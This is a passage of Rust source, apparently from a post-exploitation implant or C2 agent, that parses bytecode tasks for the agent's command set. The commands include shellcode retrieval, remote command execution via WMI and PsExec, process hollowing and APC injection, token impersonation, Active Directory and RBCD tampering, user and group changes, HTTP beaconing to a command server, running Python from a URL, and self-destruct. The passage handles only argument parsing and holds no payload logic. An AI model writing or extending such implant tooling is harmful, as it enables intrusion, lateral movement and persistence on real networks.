            Task::RegDeleteKey { .. } => Opcode::RegDeleteKey as u8,
            #[cfg(feature = "registry")]
            Task::RegSetValue { .. } => Opcode::RegSetValue as u8,
            #[cfg(feature = "registry")]
            Task::RegQueryValue { .. } => Opcode::RegQueryValue as u8,
            #[cfg(feature = "priv")]
            Task::MakeToken { .. } => Opcode::MakeToken as u8,
            #[cfg(feature = "priv")]
            Task::ImpersonateProcess { .. } => Opcode::ImpersonateProcess as u8,
            #[cfg(feature = "priv")]
            Task::EnablePrivilege { .. } => Opcode::EnablePrivilege as u8,
            #[cfg(feature = "priv")]
            Task::ListProcessPrivs { .. } => Opcode::ListProcessPrivs as u8,
            #[cfg(feature = "priv")]
            Task::ListThreadPrivs => Opcode::ListThreadPrivs as u8,
            #[cfg(feature = "filesystem")]
            Task::DeleteFile { .. } => Opcode::DeleteFile as u8,
            #[cfg(feature = "priv")]
            Task::RevertToSelf => Opcode::RevertToSelf as u8,
            #[cfg(feature = "services")]
            Task::StartService { .. } => Opcode::StartService as u8,
            #[cfg(feature = "services")]
            Task::DeleteService { .. } => Opcode::DeleteService as u8,
            #[cfg(feature = "execution")]
            Task::CreateThread { .. } => Opcode::CreateThread as u8,
            #[cfg(feature = "payload_gen")]
            Task::GenerateDll { .. } => Opcode::GenerateDll as u8,
            #[cfg(feature = "execution")]
            Task::ShellExecute { .. } => Opcode::ShellExecute as u8,
            #[cfg(feature = "execution")]
            Task::ShellExtract { .. } => Opcode::ShellExtract as u8,
            #[cfg(feature = "execution")]
            Task::ShellExecuteExplorer { .. } => Opcode::ShellExecuteExplorer as u8,
            #[cfg(feature = "payload_gen")]
            Task::LoadLibrary { .. } => Opcode::LoadLibrary as u8,
            #[cfg(all(feature = "python", feature = "network"))]
            Task::PyExec { .. } => Opcode::PyExec as u8,
            #[cfg(feature = "execution")]
            Task::Hollow { .. } => Opcode::Hollow as u8,
            #[cfg(feature = "execution")]
            Task::MigrateApc { .. } => Opcode::MigrateApc as u8,
            #[cfg(feature = "services")]
            Task::RegisterService { .. } => Opcode::RegisterService as u8,
            Task::ExitProcess { .. } => Opcode::ExitProcess as u8,
            #[cfg(feature = "execution")]
            Task::HollowApc { .. } => Opcode::HollowApc as u8,
            #[cfg(feature = "frida")]
            Task::FridaHook { .. } => Opcode::FridaHook as u8,
            #[cfg(feature = "frida")]
            Task::FridaUnhook { .. } => Opcode::FridaUnhook as u8,
            Task::Kill { .. } => Opcode::Kill as u8,
            #[cfg(feature = "c2")]
            Task::HttpBeacon { .. } => Opcode::HttpBeacon as u8,
            Task::MemRead { .. } => Opcode::MemRead as u8,
            #[cfg(feature = "mal")]
            Task::DllList { .. } => Opcode::DllList as u8,
            #[cfg(feature = "mal")]
            Task::MemMap { .. } => Opcode::MemMap as u8,
            #[cfg(feature = "mal")]
            Task::Malfind { .. } => Opcode::Malfind as u8,
            #[cfg(feature = "mal")]
            Task::LdrCheck { .. } => Opcode::LdrCheck as u8,
        }
    }
}

/// Helper: parse u8 from arg bytes
fn bytes_to_u8(data: &[u8]) -> u8 {
    if data.is_empty() { 0 } else { data[0] }
}

/// Helper: parse u16 LE from arg bytes
fn bytes_to_u16(data: &[u8]) -> u16 {
    if data.len() < 2 { 0 } else { (data[0] as u16) | ((data[1] as u16) << 8) }
}

/// Helper: parse u32 LE from arg bytes
fn bytes_to_u32(data: &[u8]) -> u32 {
    if data.len() < 4 { 0 } else {
        (data[0] as u32) | ((data[1] as u32) << 8) | ((data[2] as u32) << 16) | ((data[3] as u32) << 24)
    }
}

/// Extract u8 from Arg::Literal, returns 0 for refs or empty
fn arg_to_u8(arg: &Arg) -> u8 {
    match arg {
        Arg::Literal(data) => bytes_to_u8(data),
        _ => 0,
    }
}

/// Extract u16 from Arg::Literal, returns 0 for refs or empty
fn arg_to_u16(arg: &Arg) -> u16 {
    match arg {
        Arg::Literal(data) => bytes_to_u16(data),
        _ => 0,
    }
}

/// Extract u32 from Arg::Literal, returns 0 for refs or empty
fn arg_to_u32(arg: &Arg) -> u32 {
    match arg {
        Arg::Literal(data) => bytes_to_u32(data),
        _ => 0,
    }
}

/// Parse a single task from the reader
/// Format: [opcode:u8][num_args:u8][len1:u16][arg1...][len2:u16][arg2...]...
pub fn parse_task(reader: &mut BytecodeReader) -> Task {
    let opcode = reader.read_opcode();

    match opcode {
        Opcode::End => Task::End,

        Opcode::StoreResult => {
            // Args: [var_id:u16]
            let args = reader.read_args();
            let var_id = args.get(0).map(|a| arg_to_u16(a)).unwrap_or(0);
            Task::StoreResult { var_id }
        }

        Opcode::GetShellcode => {
            // Args: [task:u8?][magic:u32?] (both optional)
            let mut args = reader.read_args().into_iter();
            let task = args.next().unwrap_or_default();
            let magic = args.next().unwrap_or_default();
            Task::GetShellcode { task, magic }
        }

        Opcode::Sleep => {
            // Args: [duration_ms:u32]
            let args = reader.read_args();
            let duration_ms = args.get(0).map(|a| arg_to_u32(a)).unwrap_or(0);
            Task::Sleep { duration_ms }
        }

        #[cfg(feature = "execution")]
        Opcode::RunCommand => {
            // Args: [command:bytes]
            let mut args = reader.read_args().into_iter();
            let command = args.next().unwrap_or_default();
            Task::RunCommand { command }
        }

        #[cfg(feature = "filesystem")]
        Opcode::GetCwd => {
            let _args = reader.read_args();
            Task::GetCwd
        }

        #[cfg(feature = "filesystem")]
        Opcode::ReadFile => {
            // Args: [path:bytes]
            let mut args = reader.read_args().into_iter();
            let path = args.next().unwrap_or_default();
            Task::ReadFile { path }
        }

        #[cfg(feature = "filesystem")]
        Opcode::WriteFile => {
            // Args: [path:bytes][content:bytes]
            let mut args = reader.read_args().into_iter();
            let path = args.next().unwrap_or_default();
            let content = args.next().unwrap_or_default();
            Task::WriteFile { path, content }
        }

        Opcode::CheckError => {
            // Args: [var_id:u16]
            let args = reader.read_args();
            let var_id = args.get(0).map(|a| arg_to_u16(a)).unwrap_or(0);
            Task::CheckError { var_id }
        }

        Opcode::Conditional => {
            // Args: [mode:u8][var1:u16][true_idx:u16][false_idx:u16]
            // or:   [mode:u8][var1:u16][var2:u16][true_idx:u16][false_idx:u16]
            let args = reader.read_args();
            let mode = args.get(0).map(|a| arg_to_u8(a)).unwrap_or(0);
            let var1 = args.get(1).map(|a| arg_to_u16(a)).unwrap_or(0);
            if args.len() == 4 {
                // Single var check
                let true_idx = args.get(2).map(|a| arg_to_u16(a)).unwrap_or(0);
                let false_idx = args.get(3).map(|a| arg_to_u16(a)).unwrap_or(0);
                Task::Conditional { mode, var1, var2: None, true_idx, false_idx }
            } else {
                // Two var check
                let var2 = args.get(2).map(|a| arg_to_u16(a)).unwrap_or(0);
                let true_idx = args.get(3).map(|a| arg_to_u16(a)).unwrap_or(0);
                let false_idx = args.get(4).map(|a| arg_to_u16(a)).unwrap_or(0);
                Task::Conditional { mode, var1, var2: Some(var2), true_idx, false_idx }
            }
        }

        Opcode::SetVar => {
            // Args: [var_id:u16][data:bytes]
            let mut args = reader.read_args().into_iter();
            let var_id = args.next().map(|a| arg_to_u16(&a)).unwrap_or(0);
            let data = args.next().unwrap_or_default();
            Task::SetVar { var_id, data }
        }

        Opcode::PrintVar => {
            // Args: [var_id:u16] or no args (print last_result)
            let args = reader.read_args();
            let var_id = if args.is_empty() {
                None
            } else {
                Some(args.get(0).map(|a| arg_to_u16(a)).unwrap_or(0))
            };
            Task::PrintVar { var_id }
        }

        Opcode::Goto => {
            // Args: [target_idx:u16]
            let args = reader.read_args();
            let target_idx = args.get(0).map(|a| arg_to_u16(a)).unwrap_or(0);
            Task::Goto { target_idx }
        }

        #[cfg(feature = "execution")]
        Opcode::Migrate => {
            // Args: [task_id:u8][search:bytes][magic:u32?]
            let mut args = reader.read_args().into_iter();
            let task_byte = args.next().map(|a| arg_to_u8(&a)).unwrap_or(0xFF);
            let task_id = if task_byte == 0xFF { None } else { Some(task_byte) };
            let search = args.next().unwrap_or_default();
            let magic = args.next(); // None if not provided
            Task::Migrate { task_id, search, magic }
        }

        #[cfg(feature = "enumerate")]
        Opcode::ListProcs => {
            let _args = reader.read_args();
            Task::ListProcs
        }

        Opcode::GetConst => {
            // Args: [const_idx:u16]
            let args = reader.read_args();
            let const_idx = args.get(0).map(|a| arg_to_u16(a)).unwrap_or(0);
            Task::GetConst { const_idx }
        }

        #[cfg(feature = "execution")]
        Opcode::WmiExec => {
            // Args: [command:bytes][host:bytes][user:bytes][pass:bytes][domain:bytes]
            let mut args = reader.read_args().into_iter();
            let command = args.next().unwrap_or_default();
            let host = args.next().unwrap_or_default();
            let user = args.next().unwrap_or_default();
            let pass = args.next().unwrap_or_default();
            let domain = args.next().unwrap_or_default();
            Task::WmiExec { command, host, user, pass, domain }
        }

        #[cfg(feature = "network")]
        Opcode::HttpSend => {
            // Args: [method:bytes][host:bytes][port:u16][path:bytes][secure:u8][body:bytes]
            let mut args = reader.read_args().into_iter();
            let method = args.next().unwrap_or_default();
            let host = args.next().unwrap_or_default();
            let port = args.next().unwrap_or_default();
            let path = args.next().unwrap_or_default();
            let secure = args.next().unwrap_or_default();
            let body = args.next().unwrap_or_default();
            Task::HttpSend { method, host, port, path, secure, body }
        }

        #[cfg(feature = "execution")]
        Opcode::Sacrificial => {
            // Args: [image:bytes][task_id:u8][pipe_name:bytes?][search:bytes?][no_kill:u8?]
            let mut args = reader.read_args().into_iter();
            let image = args.next().unwrap_or_default();
            let task_id = args.next().unwrap_or_default();
            let pipe_name = args.next(); // None if not provided
            let search = args.next(); // None if not provided
            let no_kill = args.next(); // None if not provided
            Task::Sacrificial { image, task_id, pipe_name, search, no_kill }
        }

        #[cfg(feature = "filesystem")]
        Opcode::RedirectStdout => {
            // Args: [path:bytes]
            let mut args = reader.read_args().into_iter();
            let path = args.next().unwrap_or_default();
            Task::RedirectStdout { path }
        }

        #[cfg(all(feature = "network", feature = "payload_gen"))]
        Opcode::ShellcodeServer => {
            // Args: [port:u16][magic_base:u32?]
            let mut args = reader.read_args().into_iter();
            let port = args.next().unwrap_or_default();
            let magic_base = args.next(); // None if not provided
            Task::ShellcodeServer { port, magic_base }
        }

        #[cfg(feature = "network")]
        Opcode::ResolveHostname => {
            // Args: [hostname:bytes]
            let mut args = reader.read_args().into_iter();
            let hostname = args.next().unwrap_or_default();
            Task::ResolveHostname { hostname }
        }

        #[cfg(feature = "lateral_movement")]
        Opcode::Psexec => {
            let mut args = reader.read_args().into_iter();
            let target = args.next().unwrap_or_default();
            let service_name = args.next().unwrap_or_default();
            let display_name = args.next().unwrap_or_default();
            let binary_path = args.next().unwrap_or_default();
            let service_bin = args.next().unwrap_or_default();
            Task::Psexec { target, service_name, display_name, binary_path, service_bin }
        }

        #[cfg(feature = "payload_gen")]
        Opcode::GenerateExe => {
            // Args: [task_id:u8]
            let mut args = reader.read_args().into_iter();
            let task_id = args.next().unwrap_or_default();
            Task::GenerateExe { task_id }
        }

        #[cfg(feature = "bof")]
        Opcode::RunBof => {
            // Args: [bof_data:bytes][entry:bytes][inputs:bytes]
            let mut args = reader.read_args().into_iter();
            let bof_data = args.next().unwrap_or_default();
            let entry = args.next().unwrap_or_default();
            let inputs = args.next().unwrap_or_default();
            Task::RunBof { bof_data, entry, inputs }
        }

        #[cfg(feature = "ad")]
        Opcode::QueryLdap => {
            // Args: [base:bytes][filter:bytes][scope:u8][attribute:bytes]
            let mut args = reader.read_args().into_iter();
            let base = args.next().unwrap_or_default();
            let filter = args.next().unwrap_or_default();
            let scope = args.next().unwrap_or_default();
            let attribute = args.next().unwrap_or_default();
            Task::QueryLdap { base, filter, scope, attribute }
        }
        #[cfg(feature = "ad")]
        Opcode::SetAdAttrStr => {
            // Args: [dn:bytes][attr:bytes][value:bytes]
            let mut args = reader.read_args().into_iter();
            let dn = args.next().unwrap_or_default();
            let attr = args.next().unwrap_or_default();
            let value = args.next().unwrap_or_default();
            Task::SetAdAttrStr { dn, attr, value }
        }
        #[cfg(feature = "ad")]
        Opcode::SetAdAttrBin => {
            // Args: [dn:bytes][attr:bytes][value:bytes]
            let mut args = reader.read_args().into_iter();
            let dn = args.next().unwrap_or_default();
            let attr = args.next().unwrap_or_default();
            let value = args.next().unwrap_or_default();
            Task::SetAdAttrBin { dn, attr, value }
        }
        #[cfg(feature = "network")]
        Opcode::PortScan => {
            // Args: [targets:bytes][ports:bytes]
            let mut args = reader.read_args().into_iter();
            let targets = args.next().unwrap_or_default();
            let ports = args.next().unwrap_or_default();
            Task::PortScan { targets, ports }
        }
        #[cfg(feature = "user")]
        Opcode::SetUserPassword => {
            let mut args = reader.read_args().into_iter();
            let server = args.next().unwrap_or_default();
            let username = args.next().unwrap_or_default();
            let password = args.next().unwrap_or_default();
            Task::SetUserPassword { server, username, password }
        }
        #[cfg(feature = "user")]
        Opcode::AddUserToLocalGroup => {
            let mut args = reader.read_args().into_iter();
            let server = args.next().unwrap_or_default();
            let group = args.next().unwrap_or_default();
            let username = args.next().unwrap_or_default();
            Task::AddUserToLocalGroup { server, group, username }
        }
        #[cfg(feature = "user")]
        Opcode::RemoveUserFromLocalGroup => {
            let mut args = reader.read_args().into_iter();
            let server = args.next().unwrap_or_default();
            let group = args.next().unwrap_or_default();
            let username = args.next().unwrap_or_default();
            Task::RemoveUserFromLocalGroup { server, group, username }
        }
        #[cfg(feature = "user")]
        Opcode::GetUserSid => {
            let mut args = reader.read_args().into_iter();
            let server = args.next().unwrap_or_default();
            let username = args.next().unwrap_or_default();
            Task::GetUserSid { server, username }
        }
        #[cfg(feature = "user")]
        Opcode::AddUserToGroup => {
            let mut args = reader.read_args().into_iter();
            let server = args.next().unwrap_or_default();
            let group = args.next().unwrap_or_default();
            let username = args.next().unwrap_or_default();
            Task::AddUserToGroup { server, group, username }
        }
        #[cfg(feature = "user")]
        Opcode::RemoveUserFromGroup => {
            let mut args = reader.read_args().into_iter();
            let server = args.next().unwrap_or_default();
            let group = args.next().unwrap_or_default();
            let username = args.next().unwrap_or_default();
            Task::RemoveUserFromGroup { server, group, username }
        }
        #[cfg(feature = "ad")]
        Opcode::CreateRbcdAce => {
            let mut args = reader.read_args().into_iter();
            let sid = args.next().unwrap_or_default();
            Task::CreateRbcdAce { sid }
        }
        #[cfg(feature = "registry")]
        Opcode::RegCreateKey => {
            let mut args = reader.read_args().into_iter();
            let key = args.next().unwrap_or_default();
            Task::RegCreateKey { key }
        }
        #[cfg(feature = "registry")]
        Opcode::RegDeleteKey => {
            let mut args = reader.read_args().into_iter();
            let key = args.next().unwrap_or_default();
            Task::RegDeleteKey { key }
        }
        #[cfg(feature = "registry")]
        Opcode::RegSetValue => {
            let mut args = reader.read_args().into_iter();
            let key = args.next().unwrap_or_default();
            let value_name = args.next().unwrap_or_default();
            let value_type = args.next().unwrap_or_default();
            let value = args.next().unwrap_or_default();
            Task::RegSetValue { key, value_name, value_type, value }
        }
        #[cfg(feature = "registry")]
        Opcode::RegQueryValue => {
            let mut args = reader.read_args().into_iter();
            let key = args.next().unwrap_or_default();
            let value_name = args.next().unwrap_or_default();
            Task::RegQueryValue { key, value_name }
        }
        #[cfg(feature = "priv")]
        Opcode::MakeToken => {
            let mut args = reader.read_args().into_iter();
            let domain = args.next().unwrap_or_default();
            let username = args.next().unwrap_or_default();
            let password = args.next().unwrap_or_default();
            let logon_type = args.next();
            Task::MakeToken { domain, username, password, logon_type }
        }
        #[cfg(feature = "priv")]
        Opcode::ImpersonateProcess => {
            let mut args = reader.read_args().into_iter();
            let search = args.next().unwrap_or_default();
            Task::ImpersonateProcess { search }
        }
        #[cfg(feature = "priv")]
        Opcode::EnablePrivilege => {
            let mut args = reader.read_args().into_iter();
            let search = args.next().unwrap_or_default();
            let priv_name = args.next().unwrap_or_default();
            Task::EnablePrivilege { search, priv_name }
        }
        #[cfg(feature = "priv")]
        Opcode::ListProcessPrivs => {
            let mut args = reader.read_args().into_iter();
            let search = args.next().unwrap_or_default();
            Task::ListProcessPrivs { search }
        }
        #[cfg(feature = "priv")]
        Opcode::ListThreadPrivs => {
            let _args = reader.read_args();
            Task::ListThreadPrivs
        }
        #[cfg(feature = "filesystem")]
        Opcode::DeleteFile => {
            let mut args = reader.read_args().into_iter();
            let path = args.next().unwrap_or_default();
            Task::DeleteFile { path }
        }
        #[cfg(feature = "priv")]
        Opcode::RevertToSelf => {
            let _args = reader.read_args();
            Task::RevertToSelf
        }
        #[cfg(feature = "services")]
        Opcode::StartService => {
            let mut args = reader.read_args().into_iter();
            let target = args.next().unwrap_or_default();
            let service_name = args.next().unwrap_or_default();
            Task::StartService { target, service_name }
        }
        #[cfg(feature = "services")]
        Opcode::DeleteService => {
            let mut args = reader.read_args().into_iter();
            let target = args.next().unwrap_or_default();
            let service_name = args.next().unwrap_or_default();
            Task::DeleteService { target, service_name }
        }

        #[cfg(feature = "execution")]
        Opcode::CreateThread => {
            // Args: [task:u8?][magic:u32?] (both optional)
            let mut args = reader.read_args().into_iter();
            let task = args.next().unwrap_or_default();
            let magic = args.next().unwrap_or_default();
            Task::CreateThread { task, magic }
        }

        #[cfg(feature = "payload_gen")]
        Opcode::GenerateDll => {
            // Args: [task:u8][export_name:bytes]
            let mut args = reader.read_args().into_iter();
            let task = args.next().unwrap_or_default();
            let export_name = args.next().unwrap_or_default();
            Task::GenerateDll { task, export_name }
        }

        #[cfg(feature = "execution")]
        Opcode::ShellExecute => {
            // Args: [path:bytes][verb:bytes][args:bytes]
            let mut args = reader.read_args().into_iter();
            let path = args.next().unwrap_or_default();
            let verb = args.next().unwrap_or_default();
            let args_val = args.next().unwrap_or_default();
            Task::ShellExecute { path, verb, args: args_val }
        }

        #[cfg(feature = "execution")]
        Opcode::ShellExtract => {
            // Args: [zip_path:bytes]
            let mut args = reader.read_args().into_iter();
            let zip_path = args.next().unwrap_or_default();
            Task::ShellExtract { zip_path }
        }

        #[cfg(feature = "execution")]
        Opcode::ShellExecuteExplorer => {
            // Args: [path:bytes][verb:bytes][args:bytes]
            let mut args = reader.read_args().into_iter();
            let path = args.next().unwrap_or_default();
            let verb = args.next().unwrap_or_default();
            let args_val = args.next().unwrap_or_default();
            Task::ShellExecuteExplorer { path, verb, args: args_val }
        }

        #[cfg(feature = "payload_gen")]
        Opcode::LoadLibrary => {
            // Args: [path:bytes]
            let mut args = reader.read_args().into_iter();
            let path = args.next().unwrap_or_default();
            Task::LoadLibrary { path }
        }

        #[cfg(all(feature = "python", feature = "network"))]
        Opcode::PyExec => {
            // Args: [url:bytes][script:bytes]
            let mut args = reader.read_args().into_iter();
            let url = args.next().unwrap_or_default();
            let script = args.next().unwrap_or_default();
            Task::PyExec { url, script }
        }

        #[cfg(feature = "execution")]
        Opcode::Hollow => {
            // Args: [image:bytes][task_id:u8][search:bytes?]
            let mut args = reader.read_args().into_iter();
            let image = args.next().unwrap_or_default();
            let task_id = args.next().unwrap_or_default();
            let search = args.next(); // None if not provided
            Task::Hollow { image, task_id, search }
        }

        #[cfg(feature = "execution")]
        Opcode::MigrateApc => {
            // Args: [image:bytes][task_id:u8][magic:u32?]
            let mut args = reader.read_args().into_iter();
            let image = args.next().unwrap_or_default();
            let task_id = args.next().unwrap_or_default();
            let magic = args.next(); // None if not provided
            Task::MigrateApc { image, task_id, magic }
        }

        #[cfg(feature = "services")]
        Opcode::RegisterService => {
            // Args: [service_name:bytes]
            let mut args = reader.read_args().into_iter();
            let service_name = args.next().unwrap_or_default();
            Task::RegisterService { service_name }
        }

        Opcode::ExitProcess => {
            // Args: [exit_code:u32]
            let mut args = reader.read_args().into_iter();
            let exit_code = args.next().unwrap_or_default();
            Task::ExitProcess { exit_code }
        }

        #[cfg(feature = "execution")]
        Opcode::HollowApc => {
            // Args: [image:bytes][task_id:u8][search:bytes?]
            let mut args = reader.read_args().into_iter();
            let image = args.next().unwrap_or_default();
            let task_id = args.next().unwrap_or_default();
            let search = args.next(); // None if not provided
            Task::HollowApc { image, task_id, search }
        }


        #[cfg(feature = "frida")]
        Opcode::FridaHook => {
            // Args: [url:bytes][script:bytes][name:bytes?][callback_host:bytes?][callback_port:u16?][batch_size:u32?][flush_interval:u32?]
            let mut args = reader.read_args().into_iter();
            let url = args.next().unwrap_or_default();
            let script = args.next().unwrap_or_default();
            let name = args.next(); // None if not provided
            let callback_host = args.next(); // None if not provided
            let callback_port = args.next(); // None if not provided
            let batch_size = args.next(); // None if not provided
            let flush_interval = args.next(); // None if not provided
            Task::FridaHook { url, script, name, callback_host, callback_port, batch_size, flush_interval }
        }

        #[cfg(feature = "frida")]
        Opcode::FridaUnhook => {
            // Args: [hook_id:i32?][name:bytes?] - no args = unhook all
            let mut args = reader.read_args().into_iter();
            let hook_id = args.next(); // None if not provided
            let name = args.next(); // None if not provided
            Task::FridaUnhook { hook_id, name }
        }

        Opcode::Kill => {
            let mut args = reader.read_args().into_iter();
            let magic = args.next(); // Optional - None means self-destruct
            Task::Kill { magic }
        }

        #[cfg(feature = "c2")]
        Opcode::HttpBeacon => {
            // Args: [host:bytes][port:u16][interval_ms:u32][secure:bool?][agent_id:guid?]
            let mut args = reader.read_args().into_iter();
            let host = args.next().unwrap_or_default();
            let port = args.next().unwrap_or_default();
            let interval = args.next().unwrap_or_default();
            let secure = args.next(); // Optional
            let agent_id = args.next(); // Optional
            Task::HttpBeacon { host, port, interval, secure, agent_id }
        }

        Opcode::MemRead => {
            // Args: [address:usize][size:usize]
            let mut args = reader.read_args().into_iter();
            let address = args.next().unwrap_or_default();
            let size = args.next().unwrap_or_default();
            let pid = args.next(); // None if not provided
            Task::MemRead { address, size, pid }
        }

        #[cfg(feature = "mal")]
        Opcode::DllList => {
            // Args: [pid:u32_LE?]
            let mut args = reader.read_args().into_iter();
            let pid = args.next(); // None if not provided
            Task::DllList { pid }
        }

        #[cfg(feature = "mal")]
        Opcode::MemMap => {
            // Args: [pid:u32_LE?]
            let mut args = reader.read_args().into_iter();
            let pid = args.next(); // None if not provided
            Task::MemMap { pid }
        }

        #[cfg(feature = "mal")]
        Opcode::Malfind => {
            // Args: [pid:u32_LE?]
            let mut args = reader.read_args().into_iter();
            let pid = args.next();
            Task::Malfind { pid }
        }

        #[cfg(feature = "mal")]
        Opcode::LdrCheck => {
            // Args: [pid:u32_LE?]
            let mut args = reader.read_args().into_iter();
            let pid = args.next();
            Task::LdrCheck { pid }
        }
    }
}
